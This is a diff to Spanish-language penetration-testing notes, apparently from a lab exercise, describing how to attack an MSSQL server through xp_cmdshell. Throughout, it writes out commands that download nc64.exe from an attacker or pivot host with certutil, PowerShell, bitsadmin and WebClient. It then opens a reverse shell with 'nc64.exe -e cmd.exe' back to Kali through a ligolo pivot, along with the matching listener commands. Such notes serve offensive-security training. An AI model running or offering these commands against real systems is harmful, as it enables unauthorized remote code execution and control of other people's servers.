@@ -201,8 +201,12 @@ Paso 1:
 ❯ xp_cmdshell "mkdir C:\Temp"
 ❯ xp_cmdshell "dir C:\Temp"   # Mirar el contenido del directorio 
 
-# Paso 2 → Descargar nc64.exe desde Kali
+
+Paso 2 → Descargar nc64.exe desde Kali
 ❯ EXEC xp_cmdshell 'certutil -urlcache -split -f http://❮IP_KALI❯/nc64.exe C:\temp\nc64.exe'
+
+❯ EXEC xp_cmdshell 'certutil -urlcache -split -f http://IP_MS01:9000/nc64.exe C:\temp\nc64.exe'
+# Apuntar al server MS01 que es el pivoting a Kali 
 # Antes: 
 	python3 -m http.server 80   # Compartir el Netcat desde Kali 
 
@@ -210,16 +214,26 @@ NOTA:
 	- Si la descarga se hace desde una segunda red. Apuntar al server MS01 que es el pivote y no a Kali. 
 	- Si sale el siguiente error: ERROR(MS02\SQLEXPRESS): Line 1: An error occurred during the execution of xp_cmdshell. A call to 'CreateProcess' failed with error code: '5'. Quiere decir que 'certuril' esta siendo bloqueado y toca usar otro comando de descarga.
 
+
 # Alternativas a certutil  
 ❯ EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://IP_MS01/nc64.exe -OutFile C:\Temp\nc64.exe"'    <- MEJOR OPCIÓN  
+# Este tambien funciona para descargar Netcat a traves del servidor MS01
+
+❯ EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://IP_MS01:9000/nc64.exe -OutFile C:\Temp\nc64.exe"' 
+# Apuntar al server pivote con el puerto del listener configurado 
 
 ❯ EXEC xp_cmdshell 'bitsadmin /transfer job http://IP_MS01/nc64.exe C:\Windows\Temp\nc64.exe'
 
 ❯ xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadFile(\"http://❮IP_KALI❯/nc64.exe\",\"C:\temp\nc64.exe\")"'
 
 
-# Paso 3 → Ejecutar reverse shell
+Paso 3 → Ejecutar reverse shell
 ❯ EXEC xp_cmdshell 'C:\temp\nc64.exe -e cmd.exe ❮IP_KALI❯ 443'
+
+❯ EXEC xp_cmdshell 'C:\temp\nc64.exe -e cmd.exe IP_MS01 4445' 
+# Apuntar a la IP del pivote y gracias a ligolo se conectará a Kali
+
+
 # Antes: 
 	penelope -p 443       # Recibir la revershell en Kali  
 	rlwrap nc -nlvp 443   # Recibir la revershell en Kali
